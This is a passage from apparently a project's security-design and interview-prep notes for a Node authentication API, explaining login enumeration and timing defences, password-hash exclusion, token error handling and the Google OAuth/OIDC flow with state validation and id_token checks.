content), `httpOnly` cookies plus explicit CSRF protection would be the
stronger production posture. `localStorage` is a reasonable, simpler
choice for a project where the frontend is fully controlled, first-party
code with limited XSS surface — which is the assumption this phase makes
implicitly by returning the token in the response body. This is a
decision worth revisiting explicitly if the frontend's threat model
changes.

**Interview answer.** Storing a JWT in `localStorage` makes it readable
by any JavaScript on the page, so it's vulnerable to token theft via
XSS but immune to CSRF, since cookies aren't involved. An `httpOnly`
cookie can't be read by JavaScript at all, closing that XSS-exfiltration
path, but the browser attaches cookies to requests automatically for any
origin, which opens up CSRF unless mitigated separately with something
like `SameSite` plus a CSRF token. This API returns the token in the
JSON response body rather than setting a cookie itself, implicitly
choosing the `localStorage`-style model and leaving cookie-based storage
(and its CSRF-mitigation requirements) as the frontend's decision.

---

### User enumeration and why login errors are deliberately vague

**What it is.** User enumeration is an attack where a service's
different responses to "this email doesn't exist" versus "this email
exists but the password was wrong" let an attacker build a list of valid
registered emails, without ever guessing a correct password.

**Why it exists in this project.** `authService.login` throws the exact
same `AppError` — same status code (401), same literal message
(`'Invalid email or password'`) — whether the email doesn't exist at all
or exists with a non-matching password. `tests/services/authService.test.ts`
and `tests/routes/auth.test.ts` both assert this with `.toBe()` string
equality specifically to prevent a future edit from accidentally letting
the two messages drift apart.

**How it works mechanically.** Both failure branches inside `login`
converge on one `throw unauthorized(INVALID_CREDENTIALS_MESSAGE)` call
site's message (the constant is reused, not two separately-written
string literals that could diverge over time). A response body alone
gives an attacker no signal about which of the two cases occurred. (The
_timing_ of the response is a separate channel this same code path also
has to close — see the next section.)

**Where it lives in the codebase.** `src/services/authService.ts` —
`login`, `INVALID_CREDENTIALS_MESSAGE`.

**Common pitfalls.**

- Writing genuinely helpful-sounding but distinct error messages
  ("No account found with that email" vs. "Incorrect password") — this
  is the single most common enumeration bug, usually introduced with
  good UX intentions.
- Fixing the _message_ but leaving a _status code_ or _response shape_
  difference between the two branches (e.g. 404 for no-such-user, 401
  for wrong-password) — enumeration only requires _some_ distinguishable
  signal, not specifically the message text.
- Fixing the response but not the _timing_ — see next section.

**Production considerations.** Signup's 409 ("email already exists") is
a deliberate, different kind of disclosure that this project accepts:
knowing whether an email is _registered_ (via signup's conflict
response) is considered acceptable here, while knowing whether a
_login attempt_ against that email succeeded partially (right email,
wrong password) is not. That's a judgment call, not a universal rule —
some systems also obscure signup conflicts (e.g. "if this email isn't
already registered, we've sent a confirmation" regardless of whether it
is) for stricter enumeration resistance, at the cost of a worse signup
UX (a user can't get instant feedback that they should log in instead).

**Interview answer.** User enumeration is when an attacker learns which
emails have accounts just by observing how a login endpoint responds
differently to "no such user" versus "wrong password." This project's
login always returns the identical status code and message string for
both cases — verified by tests that check exact string equality between
the two failure paths — so a response body alone never leaks which
scenario occurred.

---

### Timing attacks on login, and the dummy-hash mitigation

**What it is.** Even with identical error _messages_, two code paths can
still take measurably different amounts of _time_ to respond — and an
attacker measuring response latency precisely enough can use that timing
difference as its own side-channel, independent of what the response
body says.

**Why it exists in this project.** Without a mitigation, `login`'s
"no such user" branch would return almost immediately (one fast indexed
`SELECT`, no row found), while its "wrong password" branch would take
the ~200-300ms a real bcrypt comparison costs (at `BCRYPT_COST=12`).
That gap is large and consistent enough to distinguish the two cases by
timing alone, even though the response bodies are byte-for-byte
identical — reopening the exact user-enumeration problem the previous
section closed via the response body.

**How it works mechanically.** `passwordService.ts` precomputes
`DUMMY_PASSWORD_HASH` once, at module load, by hashing an arbitrary
fixed string at the live `config.BCRYPT_COST`. `login`'s "no such user
or OAuth-only account" branch calls `verifyAgainstDummyHash(password)`
— discarding the boolean result entirely — purely to force one bcrypt
comparison of matching cost before throwing the 401. That makes both
branches of `login` perform exactly one bcrypt `compare()` call at the
same cost factor, so their timing profiles converge. Using
`config.BCRYPT_COST` for the dummy hash (rather than a hardcoded cost)
matters specifically because a bcrypt hash string embeds its own cost
factor, and `compare()`'s runtime is dominated by that embedded cost —
a dummy hash baked at a stale or different cost would still leak a
smaller, but measurable, timing gap against real per-user hashes.

**Where it lives in the codebase.** `DUMMY_PASSWORD_HASH` and
`verifyAgainstDummyHash` in `src/services/passwordService.ts`; consumed
in `authService.login`'s no-such-user/no-password-hash branch.

**Common pitfalls.**

- Skipping the dummy comparison as an "optimization" for the common
  case (nonexistent email) — that's precisely the branch that needs the
  extra work, not the one that can skip it.
- Baking the dummy hash at a fixed cost independent of
  `config.BCRYPT_COST` — reintroduces a smaller version of the same
  timing gap if the two costs ever diverge (e.g. after a future
  production cost-factor bump that forgets to update a hardcoded dummy).
- Believing this mitigation is exact — see below.

**Production considerations — does this fully close the attack?** Not
perfectly. It equalizes the _dominant_ cost (one bcrypt comparison at
matching cost) between the two branches, which is by far the largest
contributor to the timing gap and closes the attack for realistic,
network-latency-bounded measurement. It does **not** account for smaller
differences — e.g. the "no such user" path still runs one `SELECT`
before hitting the dummy-hash branch, and the "wrong password" path runs
a structurally similar `SELECT` before its real comparison, so those
are actually symmetric here — but a sufficiently patient, low-noise
attacker with many samples (statistical timing analysis, typically
requiring local network access or extreme measurement precision) could
in principle still detect a much smaller residual signal. This
mitigation defeats the attack under realistic conditions (a remote
attacker over normal internet latency); it is a mitigation, not a
mathematical proof of zero timing leakage.

**Interview answer.** Even with identical error messages, "no such
user" and "wrong password" naturally take different amounts of time —
one skips the expensive bcrypt comparison entirely, the other pays for
it — and that timing gap is its own side-channel for user enumeration.
The mitigation is to always perform one bcrypt comparison of matching
cost regardless of which branch is taken: this project precomputes a
dummy hash at the live cost factor and compares against it (discarding
the result) on the no-such-user path, so both branches' timing profiles
converge. It closes the attack under realistic network conditions but
isn't a mathematical guarantee against a very patient, high-precision
statistical attacker.

---

### Why password_hash must never be selected or returned casually

**What it is.** A deliberate, structural discipline in
`src/services/authService.ts`: `password_hash` is never included in a
`SELECT *`, never present in the `AuthUser` shape returned to routes,
and only ever selected in the one function (`login`) that actually needs
it, into a query-local type that isn't reused anywhere else.

**Why it exists in this project.** A single accidental
`res.json(user)` where `user` came from a `SELECT *`-style query would
leak every user's bcrypt hash straight into an API response — and unlike
most bugs, this one wouldn't necessarily be obvious in casual testing
(the response would still "look right" — a JSON object with an extra
field most people wouldn't immediately flag as a live secret).

**How it works mechanically.** Three independent layers each make this
mistake harder, not just one:

1. **Explicit column lists everywhere.** Every query in
   `authService.ts` names its columns (`SELECT id, email, email_verified,
created_at, updated_at [, password_hash]`) — never `SELECT *`. A
   future column added to `users` doesn't silently start flowing through
   existing queries.
2. **The `AuthUser` TypeScript interface has no `password_hash` field at
   all.** `login`'s one query that _does_ select `password_hash` reads
   it into a separate, query-local row type
   (`UserRow & { password_hash: string | null }`), and `toAuthUser()`
   only ever reads the five named safe fields off of it. There's no
   field for a future typo (`user.password_hash`) to accidentally
   reference — the type itself doesn't have one.
3. **Route-level tests assert the negative.**
   `tests/routes/auth.test.ts`'s `assertNoPasswordHash` helper
   stringifies every response body from every auth endpoint and asserts
   it contains neither the string `password_hash` (any casing) nor a
   bcrypt hash prefix (`$2a$`/`$2b$`) — a test that would fail loudly if
   a future change to any of the three routes ever leaked it, even
   through an unexpected path this phase didn't anticipate.

**Where it lives in the codebase.** `src/services/authService.ts`
(`AuthUser`, `UserRow`, `toAuthUser`, every query); `tests/routes/auth.test.ts`
(`assertNoPasswordHash`).

**Common pitfalls.**

- `SELECT *` "for convenience" during development, meaning to narrow it
  later — the column list should be correct from the first query, not a
  cleanup task.
- A shared row type reused across both a hash-needing function (`login`)
  and hash-excluding functions (`signup`, `getUserById`) — this
  invites exactly the kind of accidental field access the separate
  query-local type in `login` avoids.
- Testing only the "happy path" shape of a response (e.g. asserting
  `user.email` is correct) without also asserting what's _absent_ — a
  positive-only test suite can pass indefinitely while quietly leaking
  an extra field.

**Production considerations.** None beyond continuing this same
discipline as the schema and query surface grow — the pattern (explicit
columns, a type that structurally excludes sensitive fields, and a test
that asserts the negative) generalizes to any other sensitive column a
future phase might add.

**Interview answer.** `password_hash` is kept out of API responses
through three independent layers rather than one: every query in
`authService.ts` uses an explicit column list instead of `SELECT *`, the
`AuthUser` type returned to routes structurally has no field for it at
all so a typo can't reference one, and the route tests assert the
negative — stringifying every auth response and checking it never
contains the string `password_hash` or a bcrypt hash prefix. Layering
independent protections matters because any single one of them could be
accidentally bypassed by a future change; having all three means a leak
requires breaking every layer at once, and the test layer specifically
catches leaks through paths this phase didn't anticipate.

---

### Why expired and invalid tokens produce an identical client message

**What it is.** `requireAuth` and `tokenService.verifyToken` distinguish
`expired` from `invalid` internally (`VerifyTokenResult`'s discriminated
union), but `requireAuth` always sends the client the same 401 message —
`'Invalid or expired token'` — regardless of which one occurred. The
distinction is logged server-side (`req.log.warn({ reason }, ...)`) and
never exposed in the response.

**Why it exists in this project.** If a client could reliably tell
"expired" apart from "invalid" from the response alone, that's a real
information leak: "expired" specifically confirms the token was
**structurally valid and correctly signed with the real `JWT_SECRET` at
some point** — i.e., it was a genuine token issued by this server for a
real user, just stale. "Invalid" covers everything else — wrong secret,
tampered payload, pure garbage input, a token forged with a guessed
secret that happened to be wrong. An attacker holding a captured or
intercepted token (from, say, a browser history, an old log line, a lost
device) who could distinguish the two would learn whether that token was
ever a genuine, live credential worth further effort (replay attempts,
social-engineering a session refresh, etc.) versus outright worthless —
a reconnaissance signal this project denies entirely by collapsing both
outcomes to one message.

**How it works mechanically.** `verifyToken` catches
`jwt.TokenExpiredError` specifically and returns `{ ok: false, reason:
'expired' }`; every other failure (`JsonWebTokenError`, a malformed
token, a signature that doesn't match) returns `{ ok: false, reason:
'invalid' }`. `requireAuth` branches on `result.ok` but, on failure,
calls the exact same `unauthorized('Invalid or expired token')` for
both reasons — the `reason` value is only ever passed to
`req.log.warn`, never to the response.

**Where it lives in the codebase.** `src/services/tokenService.ts`
(`VerifyTokenResult`, the `reason` distinction); `src/middleware/auth.ts`
(`requireAuth`, where the distinction stops before reaching the client).

**Common pitfalls.**

- Returning a more "helpful" client-facing message for expiry
  specifically (e.g. "Your session has expired, please log in again")
  — well-intentioned UX, but it's exactly the enumeration-style leak
  this section describes; a generic client-side "please log in again"
  prompt can be shown for _either_ reason without the server's response
  needing to say which one it was.
- Logging the token itself alongside the `reason` "for debugging" —
  `requireAuth`'s logging deliberately includes `reason` and the request
  ID, never the token, matching the same discipline as the
  Authorization-header section above.

**Production considerations.** None beyond maintaining this same
discipline if additional token-rejection reasons are ever added (e.g. a
future denylist check) — any new reason should default to the same
generic client message unless there's a specific, considered argument
for exposing it.

**Interview answer.** Internally, `verifyToken` distinguishes an expired
token from an invalid one, but the client always gets the identical
"Invalid or expired token" message either way — the distinction is only
ever logged server-side. The reason is that "expired" specifically
confirms a token was genuinely issued and correctly signed at some
point, while "invalid" covers everything else including outright
forgeries; letting a client tell those apart would hand an attacker
holding a stolen or old token a way to know whether it was ever a real,
live credential worth pursuing further, which is exactly the kind of
signal a 401 response shouldn't provide.

## Phase 5: Google OAuth

### New dependencies: google-auth-library and nock

**What it is.** One runtime dependency, `google-auth-library` (Google's
own maintained Node client for OAuth 2.0/OpenID Connect), and one dev
dependency, `nock` (intercepts outbound HTTP calls in tests). `nock`
transitively adds nothing of note; `google-auth-library` pulls in
`gaxios` (its HTTP client) and `gtoken` — expected, not a surprise to
investigate later if they show up in `package-lock.json`.

**Why it exists in this project.** Three specific calls are delegated to
`google-auth-library`, and nothing else: `generateAuthUrl` (builds the
consent-screen URL), `getToken` (exchanges a code for tokens — a plain
server-to-server HTTP POST), and `verifyIdToken` (fetches Google's JWKS,
verifies an RS256 signature, checks issuer/audience/expiry). The first
two are thin enough that hand-rolling them with `fetch` would teach
nothing extra — they're documented HTTP shapes, spelled out below.
`verifyIdToken` is different: it's real cryptographic weight (key
rotation, JWKS caching, signature verification), and getting it subtly
wrong means accepting a forged identity — the same category of risk this
project already declined to hand-roll for password hashing (`bcryptjs`)
and JWT signing (`jsonwebtoken`) in Phase 4. `nock` exists because this
phase introduces the project's first genuine external-network
dependency in tests — there's no local "real Google" the way there's a
real local Postgres/Redis for every other test.

**How it works mechanically / the alternatives.** Two alternatives were
considered and rejected. Raw `fetch` for all three calls: rejected for
`verifyIdToken` specifically, since a correct implementation needs a
JWKS client anyway (another dependency) plus careful handling of key
rotation and multiple valid issuer strings — work that doesn't teach the
OAuth flow, it teaches "how to verify RS256 JWTs against a rotating key
set," a tangential skill. `openid-client`: rejected as more machinery
than a single hardcoded provider needs — it's built for dynamic
multi-provider OIDC discovery (`.well-known` fetching, configurable
token-endpoint auth methods), and its authorization-URL builder is less
explicit about what parameters go in than `google-auth-library`'s
`generateAuthUrl({ scope, state })`, where every parameter is one this
codebase passes by hand.

**Where it lives in the codebase.** `src/services/oauthService.ts` owns
the `OAuth2Client` instance and all three calls. `nock` is used only in
`tests/services/oauthService.test.ts`, intercepting
`https://oauth2.googleapis.com/token`.

**Common pitfalls.**

- Treating `google-auth-library` as a black box that "does OAuth" —
  every parameter passed into `generateAuthUrl`/`getToken` is chosen
  explicitly in `oauthService.ts`; only the JWKS-fetch/signature-verify
  internals of `verifyIdToken` are actually opaque.
- Mocking `verifyIdToken`'s return value in tests without also asserting
  what it was *called with* — a stub returns the same canned payload no
  matter its arguments, so a regression that dropped the `audience`
  check would pass silently. See the testing subsection below.
- Forgetting that `getToken`/`verifyIdToken` are genuine network calls —
  calling them from an unmocked test hits real Google infrastructure,
  which is slow, flaky in CI, and forbidden by this phase's constraints.

**Production considerations.** `google-auth-library` is Google's own
first-party client, actively maintained alongside their APIs — when
Google rotates signing keys or changes an issuer string, this dependency
gets updated to match, which a hand-rolled JWKS client would need
someone here to notice and fix manually.

**Interview answer.** I used Google's own client library for exactly
three calls — building the auth URL, exchanging a code for tokens, and
verifying the returned identity token — and hand-rolled everything else
(state generation, the route logic, find-or-create). The one piece I
didn't hand-roll, `verifyIdToken`, is the one with real cryptographic
weight: JWKS fetching, key rotation, RS256 signature verification. That's
the same category of decision as using `bcryptjs` for password hashing —
not laziness, but recognizing that a subtly wrong hand-rolled
implementation there means identity spoofing, not just a bug.

---

### The OAuth 2.0 authorization code flow, end to end

**What it is.** A four-party handshake — browser, our API (the "client"
in OAuth terms), Google's authorization server, and Google's resource/
identity data — that lets a user prove their Google identity to our
server without ever handing our server their Google password.

**Why it exists in this project.** It's the mechanism behind `GET
/api/auth/google` and `GET /api/auth/google/callback`, and it's the
reason those two routes exist as a pair rather than one endpoint: the
flow inherently has two legs, a redirect out to Google and a redirect
back.

**How it works mechanically.** Step by step, naming what each party
knows at each point:

1. Browser hits `GET /api/auth/google`. Our API generates a random
   `state`, stores it in Redis, and redirects the browser to Google's
   consent screen with `client_id`, `redirect_uri`, `scope`, `state`, and
   `response_type=code` in the URL. *Our API knows:* the state it just
   issued. *The browser knows:* nothing new yet, just a URL to follow.
   *Google knows:* nothing yet — this is the first request it sees.
2. Browser lands on Google's real consent screen, authenticates with
   Google directly (our server is never involved in or shown the
   password), and approves or denies.
3. Google redirects the browser back to `GOOGLE_REDIRECT_URI` — i.e.
   `GET /api/auth/google/callback` — with `code` and the same `state` it
   was given (or `error` if denied). *The browser knows:* an
   authorization code, but not what it's worth. *Google knows:* it just
   authenticated this user and issued a short-lived code tied to that.
4. Our API validates `state` (see the next subsection), then calls
   Google's token endpoint **server-to-server** — the browser is not
   involved in this exchange — sending `code` plus `GOOGLE_CLIENT_SECRET`
   to prove it's really our registered server. Google responds with
   tokens, including an `id_token` (a signed JWT asserting identity).
   *Our API now knows:* a verified Google identity (sub, email,
   email_verified). *Google knows:* it just handed identity/access
   tokens to whoever holds the client secret.
5. Our API verifies the `id_token`, finds or creates a local user, signs
   **our own** JWT, and redirects the browser to `FRONTEND_URL?token=...`.
   *The browser now knows:* our own session token — never Google's.

**Where it lives in the codebase.** `src/routes/auth.ts` (`GET /google`,
`GET /google/callback`); `src/services/oauthService.ts` (steps 4-5's
Google calls); `src/lib/oauthState.ts` (the state used in steps 1 and 4);
`src/services/authService.ts`'s `findOrCreateOAuthUser` (the user
lookup in step 5).

**Common pitfalls.**

- Thinking of this as one request/response — it's fundamentally two
  separate HTTP requests to our server (`/google` and `/google/callback`)
  connected only by `state` and by Google's own redirect in between.
- Forgetting the browser is a full participant that can be tampered
  with — anyone can hand-craft a request to `/google/callback` with an
  arbitrary `code`/`state`/`error`, which is exactly why state validation
  and server-side code exchange matter (both covered below).

**Production considerations.** Every step here assumes `GOOGLE_REDIRECT_URI`
exactly matches what's registered in Google Cloud Console — a mismatch
fails step 4's exchange with an opaque Google-side error, a common
first-deploy gotcha when moving from `localhost` to a real domain.

**Interview answer.** The authorization code flow is a two-leg redirect:
the browser goes to Google carrying a `state` we generated, comes back
carrying a `code` Google generated, and then our server — not the
browser — exchanges that code for tokens directly with Google, using our
client secret to prove who's asking. The browser only ever sees an
opaque code and, at the very end, our own session token; it never sees
Google's access token or our client secret.

---

### Why the browser gets a code, not a token; why the implicit flow is deprecated

**What it is.** The authorization code flow hands the *browser* only a
short-lived `code`, which is worthless without the client secret. The
now-deprecated OAuth "implicit flow" instead put an access token
directly in the redirect URL's fragment, for JavaScript to read.

**Why it exists in this project.** `GET /api/auth/google/callback`
receives a `code` and does the token exchange itself, server-side —
this project never puts a Google access token or `id_token` in a URL the
browser can read.

**How it works mechanically.** A URL fragment (`#access_token=...`) is
visible to browser extensions, gets logged by some proxies/analytics
tools, lands in browser history, and — critically — is visible to any
JavaScript running on the page, including malicious or compromised
third-party scripts. A `code`, by contrast, is useless on its own: it
must be paired with `GOOGLE_CLIENT_SECRET` (something only the server
holds) to become a real token, and Google additionally makes each code
single-use and short-lived. So even if a `code` leaks in a browser
history or a referrer header, an attacker still can't redeem it without
the secret, and it likely already expired.

**Where it lives in the codebase.** The callback handler in
`src/routes/auth.ts` only ever receives `code`/`state`/`error` as query
parameters — never a token — and the actual exchange happens inside
`exchangeCodeForIdentity` in `src/services/oauthService.ts`, which never
returns Google's raw tokens to its caller (only a verified `GoogleIdentity`).

**Common pitfalls.**

- Building an SPA-style flow that puts any Google token in a URL,
  `localStorage`, or anywhere JavaScript can read it — this project's
  browser-facing surface is only ever our own JWT, at the very end of
  the flow, via `?token=` on the `FRONTEND_URL` redirect.
- Assuming "server-side" is automatically enough — the code exchange
  being server-to-server is necessary but not sufficient; it's only safe
  *because* it also requires the client secret, which the implicit flow
  had no equivalent for.

**Production considerations.** The implicit flow is formally deprecated
in OAuth 2.0's current best-practice guidance (RFC 9700) specifically
because there's no scenario left where it's safer than authorization
code + PKCE (for public clients) or authorization code alone (for
confidential clients like this server, which can hold a secret).

**Interview answer.** The browser only ever gets a `code`, not a token,
because a code is useless without the client secret — something only our
server holds. That means even if a code leaks (browser history, a
referrer header, a compromised extension), it can't be redeemed by
anyone but us, and it's single-use and short-lived besides. The older
implicit flow put the actual access token in the URL for JavaScript to
read directly, which is why it's deprecated — anything in a URL fragment
or that JavaScript can touch is far more exposed than a code that
requires a secret to mean anything.

---

### The state parameter: the login-CSRF attack it prevents

**What it is.** A cryptographically random, single-use, short-lived
token (`generateState()` in `src/lib/oauthState.ts`) that our server
generates before redirecting to Google, and requires back — unchanged —
on the callback.

**Why it exists in this project.** Without it, `GET
/api/auth/google/callback?code=...` would accept *any* code sent to it,
from anywhere. That's exploitable: an attacker can complete their own
Google login, capture the `code` Google issues *them*, and trick a
victim's browser into visiting `/api/auth/google/callback?code=<attacker's
code>` (an `<img>` tag, a crafted link, anything that makes the victim's
browser issue that GET). The victim's browser has no way to know this
code doesn't belong to them — it's just a URL. Our server would exchange
the attacker's code, find-or-create (or log into) the *attacker's*
Google-linked account, and hand the *victim's* browser a valid session
token for the attacker's account. The victim is now unknowingly logged
in as the attacker — and anything the victim subsequently does (saving
links, connecting data) happens inside the attacker's account, which the
attacker controls and can review at their leisure. This is "login CSRF":
forging not an action, but an entire authenticated session.

**How it works mechanically.** `generateState()` produces 32 random
bytes (`node:crypto`'s `randomBytes`, base64url-encoded) — far more
entropy than needed to make guessing infeasible. `storeState()` records
it in Redis with a 10-minute TTL before the redirect to Google happens.
The callback's very first action, before even inspecting `error` or
`code`, is `consumeState()` — validate-and-delete in one atomic Redis
`GETDEL`. If the state doesn't exist (never issued, expired, or already
used), the callback throws `400` immediately and touches nothing else.
Because the attacker in the scenario above was never issued *our*
`state` value for the victim's browser to carry, their forged callback
URL either omits `state` or guesses at one — and guessing 32 random
bytes is infeasible.

**Where it lives in the codebase.** `src/lib/oauthState.ts`
(`generateState`/`storeState`/`consumeState`); `src/routes/auth.ts`'s
`/google` handler (generates+stores) and `/google/callback` handler
(consumes, first thing).

**Common pitfalls.**

- Validating `state` *after* checking `error` or exchanging `code` —
  this project deliberately checks state first, specifically so a forged
  callback carrying `error=access_denied` and no valid state can't be
  treated as a legitimate denial (see the "handling denied consent"
  subsection).
- Using a predictable or short state value — the login-CSRF attack only
  fails because the attacker can't produce or guess a state we issued;
  a weak state reopens the whole attack.
- A get-then-delete implementation of "single-use" instead of an atomic
  check-and-delete — two requests racing on the same state could both
  read it as valid before either deletes it, reopening a narrow replay
  window. `GETDEL` closes this by making the check and the delete one
  Redis operation.

**Production considerations.** The 10-minute TTL is a deliberate balance:
long enough that a real user completing Google's consent screen (which
can involve 2FA prompts, account picking, etc.) doesn't get a state
expiring mid-flow, short enough that a leaked or intercepted callback
URL stops being useful quickly.

**Interview answer.** The state parameter defeats login CSRF — an
attacker tricking a victim's browser into completing *the attacker's*
OAuth login, which would otherwise log the victim into the attacker's
account without either of them realizing it. It works because we
generate a random, single-use, short-lived value before redirecting to
Google, and refuse to process any callback that doesn't echo that exact
value back — an attacker forging a callback URL has no way to produce or
guess it. I made state validation atomic (Redis `GETDEL`) and the very
first check in the callback, specifically so it can't be raced or
bypassed by an attacker probing other paths through the handler first.

---

### Redis as an ephemeral state store, and why not a signed cookie or the database

**What it is.** The choice of *where* to keep `state` between issuing it
(`GET /google`) and checking it (`GET /google/callback`) — this project
picked Redis over the two other obvious options.

**Why it exists in this project.** `state` is exactly the kind of data
Redis is for: short-lived (10-minute TTL, expressed natively as `EX`),
write-once/read-once (`GETDEL`), and never needed again after the
handshake completes — none of that fits `users`, a table for permanent
records.

**How it works mechanically / the alternatives.** A signed cookie set on
`GET /google` and read back on the callback was the main alternative
considered. It would work for the simple case, but ties the state's
validity to *the same browser* completing the round trip, and Google's
own redirect back to our callback is itself a cross-site navigation from
the browser's perspective — some browsers' cookie `SameSite` defaults
can drop cookies across exactly this kind of redirect chain, which would
break the flow intermittently and unpredictably depending on browser/
version. Storing `state` in the `users` table (or a dedicated Postgres
table) was rejected because it's not user data at all — it exists for
minutes, belongs to no user yet (the whole point is we don't know who
this is until the callback resolves), and would need its own TTL/cleanup
logic that Redis provides natively via `EX`.

**Where it lives in the codebase.** `src/lib/oauthState.ts`, built
directly on the existing shared `redis` client from `src/lib/redis.ts` —
no new connection, no new library.

**Common pitfalls.**

- Reaching for a signed cookie by default because it "feels simpler" —
  it reintroduces a cross-site cookie-delivery dependency that Redis
  entirely sidesteps.
- Forgetting to set a TTL at all if hand-rolling a similar pattern
  elsewhere — an unbounded key is a slow leak and, worse, means a stolen
  old `state` value stays exploitable indefinitely.

**Production considerations.** This is the first ephemeral (not
permanent-record) use of Redis in the codebase — `checkRedisHealth` was
the only prior usage. If a future phase needs a similar short-lived
token (email verification links, password-reset tokens), the same
generate/store/consume shape in `oauthState.ts` is the pattern to reuse,
not a new one-off table.

**Interview answer.** I stored `state` in Redis rather than a signed
cookie because the callback redirect is itself a cross-site navigation
from the browser's perspective, and cookie `SameSite` defaults can drop
cookies across exactly that kind of hop — a flow that would then break
intermittently depending on the user's browser. Redis also gives TTL and
atomic delete-on-read natively, which matches what `state` actually is:
short-lived, write-once, read-once data that doesn't belong in a
permanent table like `users`.

---

### OpenID Connect vs. plain OAuth 2.0: what the id_token adds

**What it is.** OAuth 2.0 on its own is an *authorization* protocol — it
answers "does this app have permission to act on the user's behalf /
access this resource," via an access token. OpenID Connect (OIDC) is a
thin identity layer on top of OAuth 2.0 that adds *authentication* —
"who is this user" — via a new artifact, the `id_token`, a signed JWT.

**Why it exists in this project.** This phase needs authentication (who
is logging in), not authorization to act on a Google resource on the
user's behalf (we never call the Gmail or Drive APIs). Requesting the
`openid` scope is exactly what turns a plain OAuth request into an OIDC
request and makes Google return an `id_token` at all — without it,
Google's token response would only contain an access token, and this
codebase would have no signed, verifiable claim about *who* just
authenticated, only a token that's the wrong tool for identity (access
tokens are opaque-by-design and meant for calling APIs, not for a
relying party to parse and trust as identity).

**How it works mechanically.** `GOOGLE_SCOPES = ['openid', 'email',
'profile']` in `src/services/oauthService.ts` — `openid` triggers the
`id_token` in Google's response at all; `email`/`profile` are what put
`email`/`email_verified`/`name`/etc. claims inside that token. The
`id_token` itself is a JWT — three base64url segments, signed by Google
with RS256 — so unlike an opaque access token, it can be decoded and
its signature independently verified by any party that knows Google's
public keys, without calling back to Google for every check.

**Where it lives in the codebase.** `GOOGLE_SCOPES` and
`exchangeCodeForIdentity`'s use of `tokens.id_token` in
`src/services/oauthService.ts`; the resulting `GoogleIdentity` shape
(`googleId`, `email`, `emailVerified`) is what the rest of the app —
`findOrCreateOAuthUser`, the callback route — actually consumes, never
Google's access token.

**Common pitfalls.**

- Treating the OAuth *access token* as proof of identity — it isn't; it
  proves the bearer has some permission Google granted, not who they
  are. Only the `id_token` is meant to be parsed as an identity claim.
- Forgetting the `openid` scope and being confused when Google's
  response has no `id_token` at all — this is the single most common
  first-integration mistake with Google OAuth.

**Production considerations.** None of this app's scopes grant access to
call any Google API on the user's behalf (no Gmail, Calendar, Drive) —
if a future phase ever needs that, it would add a narrower scope for
that specific API and would then need to actually store and refresh the
resulting access/refresh tokens, which this phase deliberately never
does.

**Interview answer.** Plain OAuth 2.0 answers "is this app allowed to do
X," via an access token that's opaque and meant for calling APIs. OpenID
Connect adds an identity layer on top — the `id_token`, a signed JWT
asserting who the user is — which is what this app actually needs, since
it never calls any Google API on the user's behalf. Requesting the
`openid` scope is what turns the request into an OIDC request and makes
Google include that `id_token` at all.

---

### ID token verification: audience, issuer, expiry — what each check prevents

**What it is.** Three checks `verifyIdToken` performs on the returned
`id_token`, beyond the RS256 signature check itself: that `aud` (the
token's intended recipient) matches our `GOOGLE_CLIENT_ID`, that `iss`
(who signed it) is genuinely Google, and that `exp` (expiry) hasn't
passed.

**Why it exists in this project.** A signature check alone proves "some
real Google-issued token," not "a token meant for *this application*" or
"a token that's still current" — the other two checks close gaps a
signature check leaves open.

**How it works mechanically.**
- **Audience (`aud`)** must equal `GOOGLE_CLIENT_ID`
  (`exchangeCodeForIdentity` passes `audience: config.GOOGLE_CLIENT_ID`
  explicitly). This prevents **token substitution**: Google issues
  `id_token`s to many different registered applications; without an
  audience check, a token legitimately issued to some *other*
  application (which a malicious or compromised app could relay to us)
  would pass a bare signature check just as well as one issued to us —
  the signature only proves "Google signed this for *someone*," not
  "for us."
- **Issuer (`iss`)** must be one of Google's known issuer strings. This
  prevents accepting a **correctly-signed token from the wrong
  authority** — relevant in any system that might ever verify tokens
  from more than one identity provider; checking the issuer is what
  pins verification to "specifically Google," not "any signer whose key
  we happen to trust."
- **Expiry (`exp`)** must be in the future. This prevents **replaying an
  old, once-valid token** — without it, a token captured from months ago
  (a log line, a network capture) would still verify successfully today.

**Where it lives in the codebase.** The `audience` argument to
`client.verifyIdToken(...)` in `exchangeCodeForIdentity`
(`src/services/oauthService.ts`) — the issuer and expiry checks happen
inside `google-auth-library` itself and aren't separately coded here,
which is the whole reason this phase trusts the library for this one
call rather than hand-rolling it (see the dependencies subsection above).

**Common pitfalls.**

- Skipping the audience check (or passing the wrong value) — this is the
  single most dangerous mistake here, since a missing audience check is
  invisible in normal testing (a real token from *your own* app still
  verifies fine) and only becomes exploitable if something ever presents
  a token minted for a different client.
- Assuming signature verification alone is "identity verification" — it
  only proves authenticity of the signer, not that the token was meant
  for this application or is still current.

**Production considerations.** If this application is ever registered
with more than one `GOOGLE_CLIENT_ID` (e.g. separate web and mobile
clients sharing one backend), the audience check needs to accept an
array of valid client IDs, not a single hardcoded one — `verifyIdToken`'s
`audience` option already accepts an array for this reason.

**Interview answer.** Signature verification alone only proves "Google
genuinely signed this token for *someone*" — it doesn't prove the token
was meant for *this* application, or that it's still current. The
audience check closes the first gap: it prevents a token minted for a
different Google-registered app from being accepted here. The issuer
check pins verification to Google specifically, and the expiry check
prevents replaying an old captured token. All three are necessary
together; signature verification is necessary but not sufficient on its
own.

---

### Why we issue our own JWT instead of using Google's tokens as our session

**What it is.** After verifying the Google identity, the callback calls
`signToken(user.id)` — the exact same `tokenService.ts` function
`signup`/`login` already use — rather than forwarding Google's
`access_token` or `id_token` to the browser as a session credential.

**Why it exists in this project.** Google's tokens describe a
relationship with *Google* (this access token can call Google's APIs;
this id_token asserts a Google identity, valid until Google's own
expiry). They say nothing about a *Click Scope* user id, and nothing
downstream in this app (`requireAuth`, `GET /me`, any future link-CRUD
route) should need to know or care whether a request came from a
password login or a Google login — it should see one consistent kind of
credential either way.

**How it works mechanically.** `findOrCreateOAuthUser` returns `{ user,
token }` with the exact same shape `signup`/`login` return; `token` here
is `signToken(user.id)` — an HS256 JWT with only `sub`/`iat`/`exp`,
signed with `JWT_SECRET`, identical in structure to a password-login
token. `requireAuth` (`src/middleware/auth.ts`) verifies it exactly the
same way regardless of how the user originally authenticated — it has no
code path that even knows OAuth exists.

**Where it lives in the codebase.** `findOrCreateOAuthUser` in
`src/services/authService.ts`, reusing `signToken` from
`src/services/tokenService.ts`; the callback route in
`src/routes/auth.ts` redirects with `?token=` — this project's session
token, never `tokens.id_token` or `tokens.access_token` from Google.

**Common pitfalls.**

- Forwarding Google's `id_token` to the frontend as if it were a session
